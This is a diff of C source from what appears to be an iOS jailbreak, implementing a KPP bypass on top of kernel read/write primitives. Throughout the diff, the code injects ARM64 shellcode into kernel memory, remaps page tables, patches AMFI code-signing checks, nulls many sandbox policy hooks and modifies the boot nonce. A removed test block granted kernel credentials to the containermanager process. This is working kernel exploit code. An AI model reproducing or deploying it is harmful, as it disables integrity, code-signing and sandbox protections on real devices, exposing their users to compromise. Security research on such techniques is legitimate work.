@@ -10,11 +10,24 @@
 #include "kpp.h"
 #include "kernel.h"
 
+// @qwertyoruiop's KPP bypass
+
 #import "pte_stuff.h"
 #include "patchfinder64.h"
 
 
-kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, task_t tfp0, uint64_t credpatch) {
+//#define CS_PLATFORM_BINARY  0x4000000    /* this is a platform binary */
+//#define CS_INSTALLER        0x0000008    /* has installer entitlement */
+//#define CS_GET_TASK_ALLOW   0x0000004    /* has get-task-allow entitlement */
+//#define CS_RESTRICT         0x0000800    /* tell dyld to treat restricted */
+//#define CS_HARD             0x0000100    /* don't load invalid pages */
+//#define CS_KILL             0x0000200    /* kill process if it becomes invalid */
+
+
+//uint64_t allprocs = 0x59AC60; // iPhone 6S - 10.3.2
+
+
+kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, task_t tfp0) {
     kern_return_t ret;
     
     checkvad();
@@ -27,67 +40,12 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
         ret = KERN_FAILURE;
         goto cleanup;
     }
+    
     printf("[INFO]: sucessfully initialized kernel\n");
-    
-    
-/* TEST ----------------------------------------------------------------------*/
-    
-    {
-        #define CS_PLATFORM_BINARY  0x4000000    /* this is a platform binary */
-        #define CS_INSTALLER        0x0000008    /* has installer entitlement */
-        #define CS_GET_TASK_ALLOW   0x0000004    /* has get-task-allow entitlement */
-        #define CS_RESTRICT         0x0000800    /* tell dyld to treat restricted */
-        #define CS_HARD             0x0000100    /* don't load invalid pages */
-        #define CS_KILL             0x0000200    /* kill process if it becomes invalid */
-        
-        unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
-        unsigned offsetof_task = 0x18;                // proc_t::task
-        unsigned offsetof_p_ucred = 0x100;            // proc_t::p_ucred
-        unsigned offsetof_p_comm = 0x26c;             // proc_t::p_comm
-        unsigned offsetof_p_csflags = 0x2a8;          // proc_t::p_csflags
-        unsigned offsetof_itk_self = 0xD8;            // task_t::itk_self (convert_task_to_port)
-        unsigned offsetof_itk_sself = 0xE8;           // task_t::itk_sself (task_get_special_port)
-        unsigned offsetof_itk_bootstrap = 0x2b8;      // task_t::itk_bootstrap (task_get_special_port)
-        unsigned offsetof_ip_mscount = 0x9C;          // ipc_port_t::ip_mscount (ipc_port_make_send)
-        unsigned offsetof_ip_srights = 0xA0;          // ipc_port_t::ip_srights (ipc_port_make_send)
-        unsigned offsetof_special = 2 * sizeof(long); // host::special
-        
-        
-        uint64_t proc = ReadAnywhere64(find_allproc());
-        while (proc) {
-            //uint32_t pid = (uint32_t)ReadAnywhere32(proc + 0x10);
-            
-            char comm[20];
-            kread(proc + offsetof_p_comm, comm, 16);
-            comm[17] = 0;
-            
-            //printf("[INFO]: found proc: pid=%d name=%s \n", pid, comm);
-            
-            if (strstr(comm, "containermanager")) {
-                printf("found containermanager proc at 0x%llx \n", proc);
-                WriteAnywhere64(proc + offsetof_p_ucred, credpatch);
-                printf("gave it kern creds \n");
-            }
-            
-            // hand out entitlements?
-//            if (pid > 1) {
-//                uint32_t csflags = ReadAnywhere32(proc + offsetof_p_csflags);
-//                WriteAnywhere32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
-//            }
-            
-            proc = ReadAnywhere64(proc);
-        }
-    }
-    
-/* END TEST ------------------------------------------------------------------*/
-    
-    
-    
-    // @qwertyoruiop's KPP bypass
     
     uint64_t gStoreBase = find_gPhysBase();
     printf("[INFO]: gStoreBase = %llx \n", gStoreBase);
-
+    
     gPhysBase = ReadAnywhere64(gStoreBase);
     gVirtBase = ReadAnywhere64(gStoreBase+8);
     printf("[INFO]: gPhysBase = %llx \n", gPhysBase);
@@ -115,9 +73,9 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
     level1_table = ReadAnywhere64(ReadAnywhere64(pmap_store));
     printf("[INFO]: level1_table = %llx \n", level1_table);
     
-
+    
     uint64_t shellcode = physalloc(0x4000);
-
+    
     /*
      ldr x30, a
      ldr x0, b
@@ -129,28 +87,28 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
      .quad 0
      none of that squad shit tho, straight gang shit. free rondonumbanine
      */
-
+    
     WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
     WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
-
+    
     WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
     WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
-
+    
     char buf[0x100];
     copyin(buf, optr, 0x100);
     copyout(shellcode+0x300, buf, 0x100);
-
+    
     uint64_t physcode = findphys_real(shellcode);
-
+    
     printf("[INFO]: got phys at %llx for virt %llx\n", physcode, shellcode);
-
+    
     uint64_t idlesleep_handler = 0;
-
+    
     uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
     int z = 0;
-
+    
     int idx = 0;
     int ridx = 0;
     while (cpu) {
@@ -160,15 +118,15 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
             ret = KERN_ABORTED;
             goto cleanup;
         }
-
-
+        
+        
         if (!idlesleep_handler) {
             WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
             WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
-
+            
             idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
-
-
+            
+            
             uint32_t* opcz = malloc(0x1000);
             copyin(opcz, idlesleep_handler, 0x1000);
             idx = 0;
@@ -185,47 +143,47 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
                 }
                 ridx++;
             }
-
-
+            
+            
         }
-
+        
         printf("[INFO]: found cpu %x\n", ReadAnywhere32(cpu+0x330));
         printf("[INFO]: found physz: %llx\n", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
-
+        
         plist[z++] = cpu+0x130;
         cpu_list += 0x10;
         cpu = ReadAnywhere64(cpu_list);
     }
-
-
+    
+    
     uint64_t shc = physalloc(0x4000);
-
+    
     uint64_t regi = find_register_value(idlesleep_handler+12, 30);
     uint64_t regd = find_register_value(idlesleep_handler+24, 30);
-
+    
     printf("[INFO]: %llx - %llx\n", regi, regd);
-
+    
     for (int i = 0; i < 0x500/4; i++) {
         WriteAnywhere32(shc+i*4, 0xd503201f);
     }
-
+    
     /*
      isvad 0 == 0x4000
      */
-
+    
     uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
-
+    
     uint64_t ttbr0_real = find_register_value(idlesleep_handler + idx*4 + 24, 1);
-
+    
     printf("[INFO]: ttbr0: %llx %llx\n",ReadAnywhere64(ttbr0_real), ttbr0_real);
-
+    
     char* bbuf = malloc(0x4000);
     copyin(bbuf, ReadAnywhere64(ttbr0_real) - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
     copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
-
+    
     uint64_t physp = findphys_real(level0_pte);
-
-
+    
+    
     WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
     WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
     WriteAnywhere32(shc+8,  0xd508871f); // tlbi vmalle1
@@ -237,7 +195,7 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
     WriteAnywhere32(shc+32, 0xd65f03c0); // ret
     WriteAnywhere64(shc+40, regi);
     WriteAnywhere64(shc+48, /* new ttbr1 */ physp);
-
+    
     shc+=0x100;
     WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
     WriteAnywhere32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
@@ -264,16 +222,16 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
         WriteAnywhere32(shc+0x200+n, 0xa8c567fa); n+=4; // ldp    x26, x25, [sp], #80
         WriteAnywhere32(shc+0x200+n, 0xd65f03c0); n+=4; // ret
         WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
-
+        
     }
-
+    
     mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-
+    
     mach_vm_address_t kppsh = 0;
     mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
     {
         int n = 0;
-
+        
         WriteAnywhere32(kppsh+n, 0x580001e1); n+=4; // ldr    x1, #60
         WriteAnywhere32(kppsh+n, 0x58000140); n+=4; // ldr    x0, #40
         WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr    TTBR1_EL1, x0
@@ -289,26 +247,26 @@ kern_return_t do_kpp(int nukesb, int uref, uint64_t kernbase, uint64_t slide, ta
         WriteAnywhere64(kppsh+n, physp); n+=8;
         WriteAnywhere64(kppsh+n, physp); n+=8;
     }
-
+    
     mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-
+    
     WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
     WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
-
+    
     WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
     WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
-
+    
     /*
-
+     
      pagetables are now not real anymore, they're real af
-
+     
      */
-
+    
     uint64_t cpacr_addr = find_cpacr_write();
 #define PSZ (isvad ? 0x1000 : 0x4000)
 #define PMK (PSZ-1)
-
-
+    
+    
 #define RemapPage_(address) \
 pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
 uint64_t tte = ReadAnywhere64(tte_addr);\
@@ -332,14 +290,14 @@ TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
 TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
 WriteAnywhere64(tte_addr, tte);\
 }, level1_table, isvad ? 1 : 2);
-
+    
 #define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
-
+    
     uint64_t* remappage = calloc(512, 8);
-
+    
     int remapcnt = 0;
-
-
+    
+    
 #define RemapPage(x)\
 {\
 int fail = 0;\
@@ -354,32 +312,32 @@ RemapPage_(x+PSZ);\
 remappage[remapcnt++] = (x & (~PMK));\
 }\
 }
-
+    
     level1_table = physp - gPhysBase + gVirtBase;
     WriteAnywhere64(ReadAnywhere64(pmap_store), level1_table);
-
-
+    
+    
     uint64_t shtramp = kernbase + ((const struct mach_header *)find_mh())->sizeofcmds + sizeof(struct mach_header_64);
     RemapPage(cpacr_addr);
     WriteAnywhere32(NewPointer(cpacr_addr), 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));
-
+    
     RemapPage(shtramp);
     WriteAnywhere32(NewPointer(shtramp), 0x58000041);
     WriteAnywhere32(NewPointer(shtramp)+4, 0xd61f0020);
     WriteAnywhere64(NewPointer(shtramp)+8, kppsh);
-
+    
     uint64_t lwvm_write = find_lwvm_mapio_patch();
     uint64_t lwvm_value = find_lwvm_mapio_newj();
     RemapPage(lwvm_write);
     WriteAnywhere64(NewPointer(lwvm_write), lwvm_value);
-
-
+    
+    
     uint64_t kernvers = find_str("Darwin Kernel Version");
     uint64_t release = find_str("RELEASE_ARM");
-
+    
     RemapPage(kernvers-4);
     WriteAnywhere32(NewPointer(kernvers-4), 1);
-
+    
     RemapPage(release);
     if (NewPointer(release) == (NewPointer(release+11) - 11)) {
         copyout(NewPointer(release), "MarijuanARM", 11); /* marijuanarm */
@@ -393,40 +351,40 @@ remappage[remapcnt++] = (x & (~PMK));\
     {
         uint64_t sysbootnonce = find_sysbootnonce();
         printf("[INFO]: nonce: %x\n", ReadAnywhere32(sysbootnonce));
-
+        
         WriteAnywhere32(sysbootnonce, 1);
     }
-
-
+    
+    
     /*
      amfi
      */
     
     uint64_t memcmp_got = find_amfi_memcmpstub();
     uint64_t ret1 = find_ret_0();
-
+    
     RemapPage(memcmp_got);
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
-
+    
     uint64_t fref = find_reference(idlesleep_handler+0xC, 1, SearchInCore);
     printf("[INFO]: fref at %llx\n", fref);
-
+    
     uint64_t amfiops = find_amfiops();
     printf("[INFO]: amfistr at %llx\n", amfiops);
-
+    
     {
         /* amfi */
         uint64_t sbops = amfiops;
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-
+        
         uint64_t nopag = sbops_end - sbops;
-
+        
         for (int i = 0; i < nopag; i+= PSZ)
             RemapPage(((sbops + i) & (~PMK)));
-
+        
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
     }
-
+    
     /*
      first str
      */
@@ -436,15 +394,15 @@ remappage[remapcnt++] = (x & (~PMK));\
             int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
             int32_t myreg = (opcode >> 5) & 0x1f;
             uint64_t rgz = find_register_value(fref, myreg)+outhere;
-
+            
             WriteAnywhere64(rgz, physcode+0x200);
             break;
         }
         fref += 4;
     }
-
+    
     fref += 4;
-
+    
     /*
      second str
      */
@@ -454,7 +412,7 @@ remappage[remapcnt++] = (x & (~PMK));\
             int32_t outhere = ((opcode & 0x3FFC00) >> 10) * 8;
             int32_t myreg = (opcode >> 5) & 0x1f;
             uint64_t rgz = find_register_value(fref, myreg)+outhere;
-
+            
             WriteAnywhere64(rgz, physcode+0x100);
             break;
         }
@@ -465,19 +423,19 @@ remappage[remapcnt++] = (x & (~PMK));\
         /*
          sandbox
          */
-
+        
         uint64_t sbops = find_sbops();
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops) + PMK;
-
+        
         uint64_t nopag = (sbops_end - sbops)/(PSZ);
-
+        
         for (int i = 0; i < nopag; i++) {
             RemapPage(((sbops + i*(PSZ)) & (~PMK)));
         }
-
+        
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0); //2x
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
@@ -497,7 +455,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
-        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0); //2x
+        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
@@ -506,34 +464,35 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
     }
-
-
+    
+    
     {
         uint64_t point = find_amfiret()-0x18;
-
+        
         RemapPage((point & (~PMK)));
         uint64_t remap = NewPointer(point);
-
+        
         assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
-
+        
         WriteAnywhere32(remap, 0x58000041);
         WriteAnywhere32(remap + 4, 0xd61f0020);
         WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
-
+        
     }
-
+    
     for (int i = 0; i < z; i++) {
         WriteAnywhere64(plist[i], physcode + 0x100);
     }
-
+    
     while (ReadAnywhere32(kernvers-4) != 1) {
         sleep(1);
     }
-
+    
     printf("[INFO]: enabled patches\n");
     
     ret = KERN_SUCCESS;
-
+    
 cleanup:
     return ret;
 }
+
